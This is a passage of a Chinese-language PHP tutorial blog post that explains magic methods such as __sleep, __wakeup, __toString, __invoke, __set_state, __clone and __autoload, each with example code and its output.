class="keyword">array</span>(<span class="string">'name'</span>, <span class="string">'age'</span>); <span class="comment">// 这里必须返回一个数值，里边的元素表示返回的属性名称</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$person = <span class="keyword">new</span> Person(<span class="string">'小明'</span>); <span class="comment">// 初始赋值</span></span><br><span class="line"><span class="keyword">echo</span> serialize($person);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;br/&gt;'</span>;</span><br></pre></td></tr></table></figure><p>代码运行结果：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">当在类外部使用serialize()时会调用这里的__sleep()方法</span><br><span class="line">O:6:&quot;Person&quot;:2:&#123;s:4:&quot;name&quot;;s:8:&quot;5bCP5piO&quot;;s:3:&quot;age&quot;;i:25;&#125;</span><br></pre></td></tr></table></figure><h3 id="wakeup-，执行unserialize-时，先会调用这个函数"><a href="#wakeup-，执行unserialize-时，先会调用这个函数" class="headerlink" title="__wakeup()，执行unserialize()时，先会调用这个函数"></a>__wakeup()，执行unserialize()时，先会调用这个函数</h3><p>如果说 <code>__sleep()</code> 是白的，那么 <code>__wakeup()</code> 就是黑的了。</p><p>那么为什么呢？</p><p>因为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">与之相反，`unserialize()` 会检查是否存在一个 `__wakeup()` 方法。如果存在，则会先调用 `__wakeup` 方法，预先准备对象需要的资源。</span><br></pre></td></tr></table></figure><p>作用：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__wakeup() 经常用在反序列化操作中，例如重新建立数据库连接，或执行其它初始化操作。</span><br></pre></td></tr></table></figure><p>还是看代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $sex;</span><br><span class="line">    <span class="keyword">public</span> $name;</span><br><span class="line">    <span class="keyword">public</span> $age;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($name=<span class="string">""</span>,  $age=<span class="number">25</span>, $sex=<span class="string">'男'</span>)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = $name;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age  = $age;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;sex  = $sex;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> array</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"当在类外部使用serialize()时会调用这里的__sleep()方法&lt;br&gt;"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = base64_encode(<span class="keyword">$this</span>-&gt;name);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">array</span>(<span class="string">'name'</span>, <span class="string">'age'</span>); <span class="comment">// 这里必须返回一个数值，里边的元素表示返回的属性名称</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * __wakeup</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"当在类外部使用unserialize()时会调用这里的__wakeup()方法&lt;br&gt;"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;sex = <span class="string">'男'</span>;</span><br><span class="line">        <span class="comment">// 这里不需要返回数组</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$person = <span class="keyword">new</span> Person(<span class="string">'小明'</span>); <span class="comment">// 初始赋值</span></span><br><span class="line">var_dump(serialize($person));</span><br><span class="line">var_dump(unserialize(serialize($person)));</span><br></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">当在类外部使用serialize()时会调用这里的__sleep()方法</span><br><span class="line">string(58) &quot;O:6:&quot;Person&quot;:2:&#123;s:4:&quot;name&quot;;s:8:&quot;5bCP5piO&quot;;s:3:&quot;age&quot;;i:25;&#125;&quot; 当在类外部使用serialize()时会调用这里的__sleep()方法</span><br><span class="line">当在类外部使用unserialize()时会调用这里的__wakeup()方法</span><br><span class="line">object(Person)#2 (3) &#123; [&quot;sex&quot;]=&gt; string(3) &quot;男&quot; [&quot;name&quot;]=&gt; int(2) [&quot;age&quot;]=&gt; int(25) &#125;</span><br></pre></td></tr></table></figure><h3 id="toString-，类被当成字符串时的回应方法"><a href="#toString-，类被当成字符串时的回应方法" class="headerlink" title="__toString()，类被当成字符串时的回应方法"></a>__toString()，类被当成字符串时的回应方法</h3><p>作用：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__toString() 方法用于一个类被当成字符串时应怎样回应。例如 `echo $obj;` 应该显示些什么。</span><br></pre></td></tr></table></figure><p>注意：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">此方法必须返回一个字符串，否则将发出一条 `E_RECOVERABLE_ERROR` 级别的致命错误。</span><br></pre></td></tr></table></figure><p>警告：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">不能在 __toString() 方法中抛出异常。这么做会导致致命错误。</span><br></pre></td></tr></table></figure><p>代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $sex;</span><br><span class="line">    <span class="keyword">public</span> $name;</span><br><span class="line">    <span class="keyword">public</span> $age;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($name=<span class="string">""</span>,  $age=<span class="number">25</span>, $sex=<span class="string">'男'</span>)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = $name;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age  = $age;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;sex  = $sex;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span>  <span class="string">'go go go'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$person = <span class="keyword">new</span> Person(<span class="string">'小明'</span>); <span class="comment">// 初始赋值</span></span><br><span class="line"><span class="keyword">echo</span> $person;</span><br></pre></td></tr></table></figure><p>结果：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">go go go</span><br></pre></td></tr></table></figure><p>那么如果类中没有 __toString() 这个魔术方法运行会发生什么呢？让我们来测试下：</p><p>代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $sex;</span><br><span class="line">    <span class="keyword">public</span> $name;</span><br><span class="line">    <span class="keyword">public</span> $age;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($name=<span class="string">""</span>,  $age=<span class="number">25</span>, $sex=<span class="string">'男'</span>)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = $name;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age  = $age;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;sex  = $sex;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$person = <span class="keyword">new</span> Person(<span class="string">'小明'</span>); <span class="comment">// 初始赋值</span></span><br><span class="line"><span class="keyword">echo</span> $person;</span><br></pre></td></tr></table></figure><p>结果：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Catchable fatal error: Object of class Person could not be converted to string in D:\phpStudy\WWW\test\index.php on line 18</span><br></pre></td></tr></table></figure><p>很明显，页面报了一个致命错误，这是语法所不允许的。</p><h3 id="invoke-，调用函数的方式调用一个对象时的回应方法"><a href="#invoke-，调用函数的方式调用一个对象时的回应方法" class="headerlink" title="__invoke()，调用函数的方式调用一个对象时的回应方法"></a>__invoke()，调用函数的方式调用一个对象时的回应方法</h3><p>作用：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">当尝试以调用函数的方式调用一个对象时，__invoke() 方法会被自动调用。</span><br></pre></td></tr></table></figure><p>注意：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">本特性只在 PHP 5.3.0 及以上版本有效。</span><br></pre></td></tr></table></figure><p>直接上代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $sex;</span><br><span class="line">    <span class="keyword">public</span> $name;</span><br><span class="line">    <span class="keyword">public</span> $age;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($name=<span class="string">""</span>,  $age=<span class="number">25</span>, $sex=<span class="string">'男'</span>)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = $name;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age  = $age;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;sex  = $sex;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'这可是一个对象哦'</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$person = <span class="keyword">new</span> Person(<span class="string">'小明'</span>); <span class="comment">// 初始赋值</span></span><br><span class="line">$person();</span><br></pre></td></tr></table></figure><p>查看运行结果：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这可是一个对象哦</span><br></pre></td></tr></table></figure><p>当然，如果你执意要将对象当函数方法使用，那么会得到下面结果：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Fatal error: Function name must be a string in D:\phpStudy\WWW\test\index.php on line 18</span><br></pre></td></tr></table></figure><h3 id="set-state-，调用var-export-导出类时，此静态方法会被调用。"><a href="#set-state-，调用var-export-导出类时，此静态方法会被调用。" class="headerlink" title="__set_state()，调用var_export()导出类时，此静态方法会被调用。"></a>__set_state()，调用var_export()导出类时，此静态方法会被调用。</h3><p>作用：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">自 PHP 5.1.0 起，当调用 var_export() 导出类时，此静态方法会被自动调用。</span><br></pre></td></tr></table></figure><p>参数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">本方法的唯一参数是一个数组，其中包含按 array(&apos;property&apos; =&gt; value, ...) 格式排列的类属性。</span><br></pre></td></tr></table></figure><p>下面我们先来看看在没有加 __set_state() 情况按下，代码及运行结果如何：</p><p>上代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $sex;</span><br><span class="line">    <span class="keyword">public</span> $name;</span><br><span class="line">    <span class="keyword">public</span> $age;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($name=<span class="string">""</span>,  $age=<span class="number">25</span>, $sex=<span class="string">'男'</span>)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = $name;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age  = $age;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;sex  = $sex;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$person = <span class="keyword">new</span> Person(<span class="string">'小明'</span>); <span class="comment">// 初始赋值</span></span><br><span class="line">var_export($person);</span><br></pre></td></tr></table></figure><p>看结果：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Person::__set_state(array( &apos;sex&apos; =&gt; &apos;男&apos;, &apos;name&apos; =&gt; &apos;小明&apos;, &apos;age&apos; =&gt; 25, ))</span><br></pre></td></tr></table></figure><p>很明显，将对象中的属性都打印出来了</p><p>加了 __set_state() 之后：</p><p>继续上代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $sex;</span><br><span class="line">    <span class="keyword">public</span> $name;</span><br><span class="line">    <span class="keyword">public</span> $age;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($name=<span class="string">""</span>,  $age=<span class="number">25</span>, $sex=<span class="string">'男'</span>)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = $name;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age  = $age;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;sex  = $sex;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">__set_state</span><span class="params">($an_array)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $a = <span class="keyword">new</span> Person();</span><br><span class="line">        $a-&gt;name = $an_array[<span class="string">'name'</span>];</span><br><span class="line">        <span class="keyword">return</span> $a;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$person = <span class="keyword">new</span> Person(<span class="string">'小明'</span>); <span class="comment">// 初始赋值</span></span><br><span class="line">$person-&gt;name = <span class="string">'小红'</span>;</span><br><span class="line">var_export($person);</span><br></pre></td></tr></table></figure><p>继续看结果：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Person::__set_state(array( &apos;sex&apos; =&gt; &apos;男&apos;, &apos;name&apos; =&gt; &apos;小红&apos;, &apos;age&apos; =&gt; 25, ))</span><br></pre></td></tr></table></figure><h3 id="clone-，当对象复制完成时调用"><a href="#clone-，当对象复制完成时调用" class="headerlink" title="__clone()，当对象复制完成时调用"></a>__clone()，当对象复制完成时调用</h3><p>在多数情况下，我们并不需要完全复制一个对象来获得其中属性。但有一个情况下确实需要：如果你有一个 GTK 窗口对象，该对象持有窗口相关的资源。你可能会想复制一个新的窗口，保持所有属性与原来的窗口相同，但必须是一个新的对象（因为如果不是新的对象，那么一个窗口中的改变就会影响到另一个窗口）。还有一种情况：如果对象 A 中保存着对象 B 的引用，当你复制对象 A 时，你想其中使用的对象不再是对象 B 而是 B 的一个副本，那么你必须得到对象 A 的一个副本。</p><p>作用：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">对象复制可以通过 clone 关键字来完成（如果可能，这将调用对象的 __clone() 方法）。对象中的 __clone() 方法不能被直接调用。</span><br></pre></td></tr></table></figure><p>语法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$copy_of_object = clone $object;</span><br></pre></td></tr></table></figure><p>注意：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">当对象被复制后，PHP 5 会对对象的所有属性执行一个浅复制（shallow copy）。所有的引用属性 仍然会是一个指向原来的变量的引用。</span><br><span class="line"></span><br><span class="line">当复制完成时，如果定义了 __clone() 方法，则新创建的对象（复制生成的对象）中的 __clone() 方法会被调用，可用于修改属性的值（如果有必要的话）。</span><br></pre></td></tr></table></figure><p>看代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $sex;</span><br><span class="line">    <span class="keyword">public</span> $name;</span><br><span class="line">    <span class="keyword">public</span> $age;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($name=<span class="string">""</span>,  $age=<span class="number">25</span>, $sex=<span class="string">'男'</span>)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = $name;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age  = $age;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;sex  = $sex;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__clone</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">__METHOD__</span>.<span class="string">"你正在克隆对象&lt;br&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$person = <span class="keyword">new</span> Person(<span class="string">'小明'</span>); <span class="comment">// 初始赋值</span></span><br><span class="line">$person2 = <span class="keyword">clone</span> $person;</span><br><span class="line"></span><br><span class="line">var_dump(<span class="string">'persion1:'</span>);</span><br><span class="line">var_dump($person);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;br&gt;'</span>;</span><br><span class="line">var_dump(<span class="string">'persion2:'</span>);</span><br><span class="line">var_dump($person2);</span><br></pre></td></tr></table></figure><p>看结果：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Person::__clone你正在克隆对象</span><br><span class="line">string(9) &quot;persion1:&quot; object(Person)#1 (3) &#123; [&quot;sex&quot;]=&gt; string(3) &quot;男&quot; [&quot;name&quot;]=&gt; string(6) &quot;小明&quot; [&quot;age&quot;]=&gt; int(25) &#125; </span><br><span class="line">string(9) &quot;persion2:&quot; object(Person)#2 (3) &#123; [&quot;sex&quot;]=&gt; string(3) &quot;男&quot; [&quot;name&quot;]=&gt; string(6) &quot;小明&quot; [&quot;age&quot;]=&gt; int(25) &#125;</span><br></pre></td></tr></table></figure><p>克隆成功。</p><h3 id="autoload-，尝试加载未定义的"><a href="#autoload-，尝试加载未定义的" class="headerlink" title="__autoload()，尝试加载未定义的"></a>__autoload()，尝试加载未定义的</h3><p>作用：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">你可以通过定义这个函数来启用类的自动加载。</span><br></pre></td></tr></table></figure><p>在魔术函数 <code>__autoload()</code> 方法出现以前，如果你要在一个程序文件中实例化100个对象，那么你必须用include或者require包含进来100个类文件，或者你把这100个类定义在同一个类文件中 —— 相信这个文件一定会非常大，然后你就痛苦了。</p><p>但是有了 <code>__autoload()</code> 方法，以后就不必为此大伤脑筋了，这个类会在你实例化对象之前自动加载制定的文件。</p><p>还是通过例子来看看吧：</p><p>先看看以往的方式：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/** </span></span><br><span class="line"><span class="comment"> * 文件non_autoload.php </span></span><br><span class="line"><span class="comment"> */</span> </span><br><span class="line">   </span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">'project/class/A.php'</span>);  </span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">'project/class/B.php'</span>);  </span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">'project/class/C.php'</span>);  </span><br><span class="line">   </span><br><span class="line"><span class="keyword">if</span> (条件A) &#123;  </span><br><span class="line">    $a = <span class="keyword">new</span> A();  </span><br><span class="line">    $b = <span class="keyword">new</span> B();  </span><br><span class="line">    $c = <span class="keyword">new</span> C();  </span><br><span class="line">    <span class="comment">// … 业务逻辑  </span></span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (条件B) &#123;  </span><br><span class="line">    $a = newA();  </span><br><span class="line">    $b = <span class="keyword">new</span> B();  </span><br><span class="line">    <span class="comment">// … 业务逻辑  </span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看到了吗？不用100个，只是3个看起来就有点烦了。而且这样就会有一个问题：如果脚本执行“条件B”这个分支时，C.php这个文件其实没有必要包含。因为，任何一个被包含的文件，无论是否使用，均会被php引擎编译。如果不使用，却被编译，这样可以被视作一种资源浪费。更进一步，如果C.php包含了D.php，D.php包含了E.php。并且大部分情况都执行“条件B”分支，那么就会浪费一部分资源去编译C.php,D.php,E.php三个“无用”的文件。</p><p>那么如果使用 <code>__autoload()</code> 方式呢？</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/** </span></span><br><span class="line"><span class="comment"> * 文件autoload_demo.php </span></span><br><span class="line"><span class="comment"> */</span> </span><br><span class="line"><span class="function"><span class="keyword">function</span>  <span class="title">__autoload</span><span class="params">($className)</span> </span>&#123;  </span><br><span class="line">    $filePath = “project/<span class="class"><span class="keyword">class</span>/</span>&#123;$className&#125;.php”;  </span><br><span class="line">    <span class="keyword">if</span> (is_readable($filePath)) &#123;  </span><br><span class="line">        <span class="keyword">require</span>($filePath);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">   </span><br><span class="line"><span class="keyword">if</span> (条件A) &#123;  </span><br><span class="line">    $a = <span class="keyword">new</span> A();  </span><br><span class="line">    $b = <span class="keyword">new</span> B();  </span><br><span class="line">    $c = <span class="keyword">new</span> C();  </span><br><span class="line">    <span class="comment">// … 业务逻辑  </span></span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (条件B) &#123;  </span><br><span class="line">    $a = newA();  </span><br><span class="line">    $b = <span class="keyword">new</span> B();  </span><br><span class="line">    <span class="comment">// … 业务逻辑  </span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ok,不论效率怎么用，最起码界面看起来舒服多了，没有太多冗余的代。</p><p>再来看看这里的效率如何，我们分析下：</p><p>当php引擎第一次使用类A，但是找不到时，会自动调用 <code>__autoload</code> 方法，并将类名“A”作为参数传入。所以，我们在 <code>__autoload()</code> 中需要的做的就是根据类名，找到相应的文件，并包含进来，如果我们的方法也找不到，那么php引擎就会报错了。</p><p>注意：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td 